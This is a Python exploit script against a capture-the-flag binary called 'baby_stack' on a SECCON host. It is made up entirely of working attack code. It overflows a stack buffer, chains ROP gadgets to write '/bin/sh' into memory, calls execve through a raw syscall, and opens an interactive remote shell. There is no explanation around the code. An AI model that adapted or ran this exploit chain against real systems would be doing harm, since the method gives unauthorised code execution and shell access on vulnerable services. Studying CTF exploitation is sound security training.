import socket, struct, telnetlib, time

def sock(remoteip, remoteport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteip, remoteport))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a): return struct.pack("<Q",a)
def u(a): return struct.unpack("<Q",a)[0]

# main
s, f = sock("baby_stack.pwn.seccon.jp", 15285)
#s, f = sock("localhost", 15285)

syscall = 0x00456d85
poprdi = 0x00470931 #pop rdi ; or byte [rax+0x39], cl ; ret  ;
poprax = 0x004ac054
poprdx = 0x004a247c #pop rdx ; or byte [rax-0x77], cl ; ret  ;
poprsi = 0x0046defd
bss_addr = 0x00000000005ba260

buf = "A"*104
buf += p(0x0)
buf += p(0x0)
buf += "A"*88
buf += p(0x0)
buf += "C"*192
# read(0, bss_addr, 8) to input "/bin/sh" from STDIN
buf += p(poprax)
buf += p(bss_addr)
buf += p(poprdx)
buf += p(0x8)
buf += p(poprsi)
buf += p(bss_addr)
buf += p(poprdi)
buf += p(0x0)
buf += p(poprax)
buf += p(0x0)
buf += p(syscall)
# execve("/bin/sh",0,0)
buf += p(poprax)
buf += p(bss_addr)
buf += p(poprdx)
buf += p(0x0)
buf += p(poprsi)
buf += p(0x0)
buf += p(poprdi)
buf += p(bss_addr)
buf += p(poprax)
buf += p(0x3b)
buf += p(syscall)

f.write("AAAA" + '\n')                
time.sleep(0.5)
f.write(buf + '\n')                
time.sleep(0.5)
f.write("/bin/sh\0" + '\n')                

shell(s)          
